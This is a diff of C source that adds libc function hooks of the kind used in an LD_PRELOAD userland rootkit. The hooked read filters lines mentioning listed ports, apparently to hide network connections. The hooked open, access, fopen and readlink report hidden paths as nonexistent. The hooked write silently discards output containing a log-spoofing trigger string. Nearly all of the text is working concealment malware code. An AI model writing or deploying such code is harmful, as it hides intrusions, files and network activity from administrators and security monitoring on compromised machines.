@@ -290,4 +290,91 @@ ssize_t read(int fd, void *buf, size_t count) {
 
             for (ssize_t i = 0; i < ret; ++i) {
                 if (((char*)buf)[i] == '\n' || i == ret - 1) {
-                    ssize_t line_len = &((char*)buf)[i] - line_star
+                    ssize_t line_len = &((char*)buf)[i] - line_start + 1;
+                    int should_hide = 0;
+                    for (int j = 0; j < NUM_PORTS_TO_HIDE; ++j) {
+                        char hex_port[16];
+                        snprintf(hex_port, sizeof(hex_port), ":%04X", PORTS_TO_HIDE[j]);
+                        if (memmem(line_start, line_len, hex_port, strlen(hex_port)) != NULL) {
+                            should_hide = 1;
+                            break;
+                        }
+                    }
+                    if (!should_hide) {
+                        memcpy(write_ptr, line_start, line_len);
+                        write_ptr += line_len;
+                        filtered_len += line_len;
+                    }
+                    line_start = &((char*)buf)[i] + 1;
+                }
+            }
+            memcpy(buf, temp_buf, filtered_len);
+            free(temp_buf);
+            return filtered_len;
+        }
+    }
+    return ret;
+}
+
+ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
+    if (!original_readlink) { errno = EFAULT; return -1; }
+    ssize_t ret = original_readlink(pathname, buf, bufsiz);
+    if (ret > 0 && (size_t)ret < bufsiz) {
+        buf[ret] = '\0'; 
+        if (should_hide_path(buf)) {
+            errno = ENOENT;
+            return -1;
+        }
+    }
+    return ret;
+}
+
+
+int open(const char *pathname, int flags, ...) {
+    if (!original_open) { errno = EFAULT; return -1; }
+    
+    char full_path[PATH_MAX];
+    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
+        errno = ENOENT;
+        return -1;
+    }
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+    return original_open(pathname, flags, mode);
+}
+
+int access(const char *pathname, int mode) {
+    if (!original_access) { errno = EFAULT; return -1; }
+    
+    char full_path[PATH_MAX];
+    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return original_access(pathname, mode);
+}
+
+ssize_t write(int fd, const void *buf, size_t count) {
+    if (!original_write) { errno = EFAULT; return -1; }
+    if (memmem(buf, count, LOG_SPOOF_TRIGGER, strlen(LOG_SPOOF_TRIGGER)) != NULL) {
+        return count;
+    }
+    return original_write(fd, buf, count);
+}
+
+FILE* fopen(const char *path, const char *mode) {
+    if (!original_fopen) { errno = ENOENT; return NULL; }
+
+    char full_path[PATH_MAX];
+    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
+        errno = ENOENT;
+        return NULL;
+    }
+    return original_fopen(path, mode);
+}
